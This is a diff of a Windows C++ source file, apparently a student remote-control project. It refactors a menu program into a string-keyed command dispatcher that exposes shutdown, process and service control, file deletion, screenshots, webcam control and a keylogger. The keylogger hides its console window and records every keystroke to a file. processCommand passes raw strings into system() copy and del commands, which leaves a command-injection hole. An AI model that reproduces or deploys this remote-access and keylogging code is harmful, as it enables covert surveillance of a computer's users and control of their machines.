@@ -1,34 +1,44 @@
-// #define _WIN32_WINNT 0x0A00
-#include <Windows.h>
-#include <string>
-#include <stdlib.h>
-#include <stdio.h>
-#include <iostream>
-#include <fstream>
-#include <vector>
-#include <shellscalingapi.h>
-#include <tlhelp32.h>
-#include <tchar.h>
-// #include <TlHelp32.h>
-#include <psapi.h>
-#include <set>
-#include <filesystem>
+#include "services.h"
 
-using namespace std;
-namespace fs = std::filesystem;
+namespace Services {
+    std::map<std::string, bool(*)(const std::string&)> servicesMap {
+        {"system-shutdown",     &shutdownComputer}, 
+        {"system-restart",      &restartComputer},
+        {"application-list",    &listApplications},
+        {"application-start",   &startApplication},
+        {"application-stop",    &stopApplication},
+        {"service-list",        &listServices},
+        {"service-start",       &startService},
+        {"service-stop",        &stopService},
+        {"file-delete",         &deleteFile},
+        {"screenshot",          &takeScreenShot},
+        {"keylogger",           &keyLogger},
+        {"webcam-start",        &startWebcam},
+        {"webcam-stop",         &stopWebcam}
+    };
+};
 
-void shutdownComputer()
-{
-    system("shutdown /s /f /t 0");
+bool Services::shutdownComputer(const std::string &saveFile) {
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
+    }
+    fout << "Shutdown operating system success!\n";
+    fout.close();
+    return system("shutdown /s /f /t 10") == 0;
 }
 
-void restartComputer()
-{
-    system("shutdown /r /f /t 0");
+bool Services::restartComputer(const std::string &saveFile) {
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
+    }
+    fout << "Restart operating system success!\n";
+    fout.close();
+    return system("shutdown /r /f /t 10") == 0;
 }
 
-bool SpecialKeys(int S_Key, std::string &logData)
-{
+bool Services::SpecialKeys(int S_Key, std::string &logData) {
     switch (S_Key)
     {
     case VK_SPACE:
@@ -223,70 +233,53 @@ bool SpecialKeys(int S_Key, std::string &logData)
     }
 }
 
-string keyLogger()
-{
+bool Services::keyLogger(const std::string &saveFile) {
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
+    }
+
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    string logData = "";
+    std::string logData = "";
     bool flag = 1;
-    while (flag)
-    {
+    while (flag) {
         Sleep(10);
-        for (int k = 8; k <= 256; k++)
-        {
-            if (GetAsyncKeyState(k) == -32767)
-            {
-                if (k == VK_ESCAPE)
-                {
+        for (int k = 8; k <= 256; k++) {
+            if (GetAsyncKeyState(k) == -32767) {
+                if (k == VK_ESCAPE) {
                     flag = 0;
                     break;
                 }
                 if (!SpecialKeys(k, logData))
-                    logData += char(k);
+                    fout << char(k);
             }
         }
     }
-    return logData;
+    
+    fout.close();
+    return true;
 }
 
-struct RunningApp
-{
-    DWORD processID;
-    string windowTitle;
-    string executableName;
-
-    bool operator<(const RunningApp &other) const
-    {
-        return tie(processID, windowTitle) < tie(other.processID, other.windowTitle);
-    }
-};
-bool isSystemApp(const string &windowTitle, const string &executableName)
-{
-    vector<string> excludedTitles = {"Settings", "Program Manager", "Windows Input Experience"};
-    vector<string> excludedExecutables = {"SystemSettings.exe", "explorer.exe", "TextInputHost.exe", "ApplicationFrameHost.exe"};
-    for (const string &title : excludedTitles)
-    {
-        if (windowTitle.find(title) != string::npos)
+bool Services::isSystemApp(const std::string &windowTitle, const std::string &executableName) {
+    std::vector<std::string> excludedTitles = {"Settings", "Program Manager", "Windows Input Experience"};
+    std::vector<std::string> excludedExecutables = {"SystemSettings.exe", "explorer.exe", "TextInputHost.exe", "ApplicationFrameHost.exe"};
+    for (const std::string &title : excludedTitles) {
+        if (windowTitle.find(title) != std::string::npos)
             return true;
     }
-    for (const string &exe : excludedExecutables)
-    {
-        if (executableName.find(exe) != string::npos)
+    for (const std::string &exe : excludedExecutables) {
+        if (executableName.find(exe) != std::string::npos)
             return true;
     }
 
     return false;
 }
 
-string extractAppName(const string &path)
-{
-    size_t pos = path.find_last_of("\\/");
-    if (pos != string::npos)
-        return path.substr(pos + 1);
-    return path;
+std::string Services::extractAppName(const std::string &path) {
+    return std::filesystem::path(path).filename().string();
 }
 
-BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
-{
+BOOL CALLBACK Services::EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     DWORD processID;
     GetWindowThreadProcessId(hwnd, &processID);
 
@@ -296,14 +289,14 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
         app.processID = processID;
 
         int length = GetWindowTextLength(hwnd) + 1;
-        vector<char> title(length);
+        std::vector<char> title(length);
         GetWindowTextA(hwnd, &title[0], length);
         app.windowTitle = &title[0];
 
         HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
         if (hProcess)
         {
-            vector<char> exeName(MAX_PATH);
+            std::vector<char> exeName(MAX_PATH);
             if (GetModuleFileNameExA(hProcess, NULL, &exeName[0], MAX_PATH))
             {
                 app.executableName = &exeName[0];
@@ -313,82 +306,75 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 
         if (!isSystemApp(app.windowTitle, app.executableName))
         {
-            set<RunningApp> *apps = reinterpret_cast<set<RunningApp> *>(lParam);
+            std::set<RunningApp> *apps = reinterpret_cast<std::set<RunningApp> *>(lParam);
             apps->insert(app);
         }
     }
     return TRUE;
 }
 
-void listApplications()
-{
-    set<RunningApp> runningApps;
+bool Services::listApplications(const std::string &saveFile) {
+    std::set<RunningApp> runningApps;
     EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&runningApps));
-    cout << "Cac ung dung dang chay:\n";
-    for (const auto &app : runningApps)
-    {
-        cout << "Process ID: " << app.processID
+
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
+    }
+
+    fout << "Cac ung dung dang chay:\n";
+    for (const auto &app : runningApps) {
+        fout << "Process ID: " << app.processID
              << "\nTieu de cua so: " << app.windowTitle
              << "\nTen executable: " << extractAppName(app.executableName)
              << "\nPath: " << app.executableName << "\n\n";
     }
+
+    fout.close();
+    return true;
 }
 
-bool getApplicationPathFromSearch(const string &appName, string &appPath)
-{
+bool Services::getApplicationPathFromSearch(const std::string &appName, std::string &appPath) {
     char result[MAX_PATH];
 
     // Tìm đường dẫn ứng dụng bằng tên thông qua Windows API
-    HINSTANCE hFind = FindExecutable(appName.c_str(), NULL, result);
-    if ((hFind != NULL) && (hFind > (HINSTANCE)32))
-    {
+    HINSTANCE hFind = FindExecutableA(appName.c_str(), NULL, result);
+    if ((hFind != NULL) && (hFind > (HINSTANCE)32)) {
         appPath = result;
         return true;
     }
     return false;
 }
 
-void startApplication(const string &appName)
-{
-    string appPath;
+bool Services::startApplication(const std::string &appName) {
+    std::string appPath;
 
     // Tìm kiếm ứng dụng bằng tên
-    if (getApplicationPathFromSearch(appName, appPath))
-    {
+    if (getApplicationPathFromSearch(appName, appPath)) {
         // Nếu tìm thấy đường dẫn ứng dụng
-        string command = "start \"\" \"" + appPath + "\"";
-        system(command.c_str());
-        cout << "Starting application: " << appName << endl;
+        std::string command = "start \"\" \"" + appPath + "\"";
+        std::cout << "Starting application: " << appName << '\n';
+        return system(command.c_str());
     }
-    else
-    {
-        cout << "Application " << appName << " not found" << endl;
+    else {
+        std::cout << "Application " << appName << " not found" << '\n';
+        return false;
     }
 }
 
-string getFileName(const string &filePath)
-{
-    size_t pos = filePath.find_last_of("\\/");
-    return (pos == string::npos) ? filePath : filePath.substr(pos + 1);
-}
-
-bool isApplicationRunning(const string &appName)
-{
-    string processName = getFileName(appName);
+bool Services::isApplicationRunning(const std::string &appName) {
+    std::string processName = extractAppName(appName);
     bool isRunning = false;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    if (hSnapshot != INVALID_HANDLE_VALUE)
-    {
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32 pe;
         pe.dwSize = sizeof(PROCESSENTRY32);
 
-        if (Process32First(hSnapshot, &pe))
-        {
-            do
-            {
-                if (processName == pe.szExeFile)
-                {
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                std::wcout << pe.szExeFile << '\n';
+                if (strcmp(processName.c_str(), pe.szExeFile) == 0) {
                     isRunning = true;
                     break;
                 }
@@ -399,28 +385,30 @@ bool isApplicationRunning(const string &appName)
     return isRunning;
 }
 
-void stopApplication(const string &appPath)
-{
-    string processName = getFileName(appPath);
-    if (isApplicationRunning(processName))
-    {
-        string command = "taskkill /IM " + processName + " /F";
-        system(command.c_str());
-        cout << "Stopping application: " << appPath << "\n";
+bool Services::stopApplication(const std::string &appPath) {
+    std::string processName = extractAppName(appPath);
+    std::cout << "Process name: " << processName << '\n';
+    if (isApplicationRunning(processName)) {
+        std::string command = "taskkill /IM " + processName + " /F";
+        std::cout << "Stopping application: " << appPath << "\n";
+        return system(command.c_str());
     }
-    else
-    {
-        cout << "Application is not running: " << appPath << "\n";
+    else {
+        std::cout << "Application is not running: " << appPath << "\n";
+        return false;
     }
 }
 
-void listServices()
-{
+bool Services::listServices(const std::string &saveFile) {
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
+    }
+
     SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
-    if (scmHandle == NULL)
-    {
+    if (scmHandle == NULL) {
         std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
-        return;
+        return false;
     }
 
     DWORD bytesNeeded = 0;
@@ -435,89 +423,82 @@ void listServices()
         {
             std::cerr << "Error calling EnumServicesStatus for size calculation: " << error << std::endl;
             CloseServiceHandle(scmHandle);
-            return;
+            return false;
         }
     }
 
     // Cấp phát bộ nhớ ban đầu
     LPENUM_SERVICE_STATUS services = NULL;
     services = (LPENUM_SERVICE_STATUS)LocalAlloc(LMEM_ZEROINIT, bytesNeeded);
-    if (services == NULL)
-    {
+    if (services == NULL) {
         std::cerr << "Error allocating memory" << std::endl;
         CloseServiceHandle(scmHandle);
-        return;
+        return false;
     }
 
     // Lần gọi EnumServicesStatus để liệt kê các dịch vụ
-    if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle))
-    {
+    if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
         DWORD error = GetLastError();
-        if (error == ERROR_MORE_DATA)
-        {
+        if (error == ERROR_MORE_DATA) {
             // Nếu thiếu bộ nhớ, cấp phát lại mà không in thông báo
             services = (LPENUM_SERVICE_STATUS)LocalReAlloc(services, bytesNeeded, LMEM_ZEROINIT);
-            if (services == NULL)
-            {
+            if (services == NULL) {
                 std::cerr << "Error reallocating memory" << std::endl;
                 CloseServiceHandle(scmHandle);
-                return;
+                return false;
             }
 
             // Gọi lại EnumServicesStatus
-            if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle))
-            {
+            if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
                 std::cerr << "Error enumerating services after reallocating memory: " << GetLastError() << std::endl;
                 LocalFree(services);
                 CloseServiceHandle(scmHandle);
-                return;
+                return false;
             }
         }
-        else
-        {
+        else {
             std::cerr << "Error enumerating services: " << error << std::endl;
             LocalFree(services);
             CloseServiceHandle(scmHandle);
-            return;
+            return false;
         }
     }
 
     // Hiển thị tên của các dịch vụ
-    for (DWORD i = 0; i < servicesCount; i++)
-    {
-        std::wcout << services[i].lpServiceName << std::endl;
+    for (DWORD i = 0; i < servicesCount; i++) {
+        fout << services[i].lpServiceName << std::endl;
     }
 
     // Giải phóng bộ nhớ và đóng handle của SCM
     LocalFree(services);
     CloseServiceHandle(scmHandle);
+    fout.close();
+
+    return true;
 }
 
-void startService(const std::string &serviceName)
-{
+bool Services::startService(const std::string &serviceName) {
     SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
-    if (scmHandle == NULL)
-    {
+    if (scmHandle == NULL) {
         std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
-        return;
+        return false;
     }
 
     // Chuyển std::string sang LPSTR (mảng char) cho API Windows
-    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName.c_str(), SERVICE_START);
+    SC_HANDLE serviceHandle = OpenServiceA(scmHandle, serviceName.c_str(), SERVICE_START);
     if (serviceHandle == NULL)
     {
         std::cerr << "Error opening service: " << GetLastError() << std::endl;
         CloseServiceHandle(scmHandle);
-        return;
+        return false;
     }
 
     // Bắt đầu dịch vụ
-    if (!StartService(serviceHandle, 0, NULL))
-    {
+    if (!StartService(serviceHandle, 0, NULL)) {
         std::cerr << "Error starting service: " << GetLastError() << std::endl;
         CloseServiceHandle(serviceHandle);
         CloseServiceHandle(scmHandle);
-        return;
+        return false;
     }
 
     std::cout << "Service " << serviceName << " started successfully!" << std::endl;
@@ -525,48 +506,46 @@ void startService(const std::string &serviceName)
     // Đóng handle
     CloseServiceHandle(serviceHandle);
     CloseServiceHandle(scmHandle);
+
+    return true;
 }
 
-void stopService(const std::string &serviceName)
-{
+bool Services::stopService(const std::string &serviceName) {
     SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
-    if (scmHandle == NULL)
-    {
+    if (scmHandle == NULL) {
         std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
-        return;
+        return false;
     }
 
-    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName.c_str(), SERVICE_STOP);
-    if (serviceHandle == NULL)
-    {
+    SC_HANDLE serviceHandle = OpenServiceA(scmHandle, serviceName.c_str(), SERVICE_STOP);
+    if (serviceHandle == NULL) {
         DWORD dwError = GetLastError();
         std::cerr << "Error opening service: " << dwError << std::endl;
-        if (dwError == ERROR_ACCESS_DENIED)
-        {
+        if (dwError == ERROR_ACCESS_DENIED) {
             std::cerr << "Access Denied. Try running the program as Administrator." << std::endl;
         }
         CloseServiceHandle(scmHandle);
-        return;
+        return false;
     }
 
     SERVICE_STATUS status;
-    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status))
-    {
+    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
         DWORD dwError = GetLastError();
         std::cerr << "Error stopping service: " << dwError << std::endl;
         CloseServiceHandle(serviceHandle);
         CloseServiceHandle(scmHandle);
-        return;
+        return false;
     }
 
     std::cout << "Service " << serviceName << " stopped successfully!" << std::endl;
 
     CloseServiceHandle(serviceHandle);
     CloseServiceHandle(scmHandle);
+
+    return true;
 }
 
-bool CaptureScreen(const std::string &filename)
-{
+bool Services::CaptureScreen(const std::string &filename) {
     // Lấy kích thước màn hình
     UINT dpi = 96;
     HMONITOR hMonitor = MonitorFromWindow(nullptr, MONITOR_DEFAULTTOPRIMARY);
@@ -659,129 +638,157 @@ bool CaptureScreen(const std::string &filename)
     return true;
 }
 
-void takeScreenShot()
-{
+bool Services::takeScreenShot(const std::string &filename) {
     SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
-    std::string filename = "C:\\Users\\LENOVO\\oop\\screenshot.png";
-    if (!CaptureScreen(filename))
-    {
-        std::cerr << "Chụp màn hình thất bại!" << std::endl;
-        return;
+    return CaptureScreen(filename);
+}
+
+bool Services::copyFile(const std::string &fileSrc, const std::string &fileDes) {
+    std::string command = "copy " + fileSrc + " " + fileDes;
+    return system(command.c_str()) == 0;
+}
+
+bool Services::deleteFile(const std::string &fileName) {
+    std::string command = "del \"" + fileName + "\"";
+    return system(command.c_str()) == 0;
+}
+
+bool Services::startWebcam(const std::string &saveFile) {
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
     }
+    fout << "Start webcam success!\n";
+    fout.close();
+    return system("start microsoft.windows.camera:") == 0;
 }
 
-void copyFile(const string &fileSrc, const string &fileDes)
-{
-    string command = "copy " + fileSrc + " " + fileDes;
-    system(command.c_str());
-}
-
-void deleteFile(const string &fileName)
-{
-    string command = "del \"" + fileName + "\"";
-    system(command.c_str());
-}
-
-void startWebcam()
-{
-    system("start microsoft.windows.camera:");
-}
-void stopWebcam()
-{
-    system("taskkill /F /IM WindowsCamera.exe");
-}
-
-int main()
-{
-    int choice;
-    cout << "Select 1 option: " << endl;
-    cout << "\t1. Shutdown" << endl;
-    cout << "\t2. Reset" << endl;
-    cout << "\t3. Keylogger" << endl;
-    cout << "\t4. List of applications" << endl;
-    cout << "\t5. Start application" << endl;
-    cout << "\t6. Stop application" << endl;
-    cout << "\t7. List of services" << endl;
-    cout << "\t8. Start service" << endl;
-    cout << "\t9. Stop service" << endl;
-    cout << "\t10. Screenshot" << endl;
-    cout << "\t11. Copy file" << endl;
-    cout << "\t12. Delete file" << endl;
-    cout << "\t13. Start webcam" << endl;
-    cout << "\t14. Stop webcam" << endl;
-    cout << "\t0. Exit program" << endl;
-    cout << "Enter selection: ";
-    cin >> choice;
-    string appName, serviceName, fileName, srcFile, desFile;
-    string logData;
-    switch (choice)
-    {
-    case 1:
-        cout << "Shutting down the computer..." << endl;
-        shutdownComputer();
-        break;
-    case 2:
-        cout << "Restarting the computer..." << endl;
-        restartComputer();
-        break;
-    case 3:
-        logData = keyLogger();
-        cout << logData;
-        break;
-    case 4:
-        cout << "List of applications:\n";
-        listApplications();
-        break;
-    case 5:
-        cout << "Enter the name of the application to open: ";
-        cin >> appName;
-        startApplication(appName);
-        break;
-    case 6:
-        cout << "Enter the name of the application to stop: ";
-        cin >> appName;
-        stopApplication(appName);
-        break;
-    case 7:
-        listServices();
-        break;
-    case 8:
-        cout << "Enter the name of the service to open: ";
-        cin >> serviceName;
-        startService(serviceName);
-        break;
-    case 9:
-        cout << "Enter the name of the service to stop: ";
-        cin >> serviceName;
-        stopService(serviceName);
-        break;
-    case 10:
-        takeScreenShot();
-        break;
-    case 11:
-        cout << "Enter source file name: ";
-        cin >> srcFile;
-        cout << "Enter destination file name: ";
-        cin >> desFile;
-        copyFile(srcFile, desFile);
-        break;
-    case 12:
-        cout << "Enter file name to delete: ";
-        cin >> fileName;
-        deleteFile(fileName);
-        break;
-    case 13:
-        startWebcam();
-        break;
-    case 14:
-        stopWebcam();
-        break;
-    case 0:
-        cout << "Exit the program" << endl;
-        return 0;
-    default:
-        cout << "Invalid selection!" << endl;
-        break;
+bool Services::stopWebcam(const std::string &saveFile) {
+    std::ofstream fout(saveFile.c_str());
+    if (!fout.is_open()) {
+        return false;
     }
-    return 0;
+    fout << "Stop webcam success!\n";
+    fout.close();
+    return system("taskkill /F /IM WindowsCamera.exe") == 0;
 }
+
+bool Services::processCommand(std::string &command) {
+    int pos = command.find(' ');
+    if (pos == command.npos) {
+        return false;
+    }
+
+    std::string type = command.substr(0, pos);
+    std::cout << "Type: " << type << '\n';
+
+    if (type == "file-copy") {
+        int pos2 = command.find(' ', pos + 1);
+        std::string pathSrc = command.substr(pos + 1, pos2 - pos - 1);
+        std::string pathDes = command.substr(pos2 + 1, command.size() - pos2 - 1);
+        return copyFile(pathSrc, pathDes);
+    }
+
+    if (servicesMap.find(type) == servicesMap.end()) {
+        return false;
+    }
+
+    std::string str = command.substr(pos + 1, command.size() - pos - 1);
+    std::cout << "File: " << str << '\n';
+    return servicesMap[type](str);
+}
+
+// int main()
+// {
+//     int choice;
+//     cout << "Select 1 option: " << endl;
+//     cout << "\t1. Shutdown" << endl;
+//     cout << "\t2. Reset" << endl;
+//     cout << "\t3. Keylogger" << endl;
+//     cout << "\t4. List of applications" << endl;
+//     cout << "\t5. Start application" << endl;
+//     cout << "\t6. Stop application" << endl;
+//     cout << "\t7. List of services" << endl;
+//     cout << "\t8. Start service" << endl;
+//     cout << "\t9. Stop service" << endl;
+//     cout << "\t10. Screenshot" << endl;
+//     cout << "\t11. Copy file" << endl;
+//     cout << "\t12. Delete file" << endl;
+//     cout << "\t13. Start webcam" << endl;
+//     cout << "\t14. Stop webcam" << endl;
+//     cout << "\t0. Exit program" << endl;
+//     cout << "Enter selection: ";
+//     cin >> choice;
+//     std::string appName, serviceName, fileName, srcFile, desFile;
+//     std::string logData;
+//     switch (choice)
+//     {
+//     case 1:
+//         cout << "Shutting down the computer..." << endl;
+//         shutdownComputer();
+//         break;
+//     case 2:
+//         cout << "Restarting the computer..." << endl;
+//         restartComputer();
+//         break;
+//     case 3:
+//         logData = keyLogger();
+//         cout << logData;
+//         break;
+//     case 4:
+//         cout << "List of applications:\n";
+//         listApplications();
+//         break;
+//     case 5:
+//         cout << "Enter the name of the application to open: ";
+//         cin >> appName;
+//         startApplication(appName);
+//         break;
+//     case 6:
+//         cout << "Enter the name of the application to stop: ";
+//         cin >> appName;
+//         stopApplication(appName);
+//         break;
+//     case 7:
+//         listServices();
+//         break;
+//     case 8:
+//         cout << "Enter the name of the service to open: ";
+//         cin >> serviceName;
+//         startService(serviceName);
+//         break;
+//     case 9:
+//         cout << "Enter the name of the service to stop: ";
+//         cin >> serviceName;
+//         stopService(serviceName);
+//         break;
+//     case 10:
+//         takeScreenShot();
+//         break;
+//     case 11:
+//         cout << "Enter source file name: ";
+//         cin >> srcFile;
+//         cout << "Enter destination file name: ";
+//         cin >> desFile;
+//         copyFile(srcFile, desFile);
+//         break;
+//     case 12:
+//         cout << "Enter file name to delete: ";
+//         cin >> fileName;
+//         deleteFile(fileName);
+//         break;
+//     case 13:
+//         startWebcam();
+//         break;
+//     case 14:
+//         stopWebcam();
+//         break;
+//     case 0:
+//         cout << "Exit the program" << endl;
+//         return 0;
+//     default:
+//         cout << "Invalid selection!" << endl;
+//         break;
+//     }
+//     return 0;
+// }
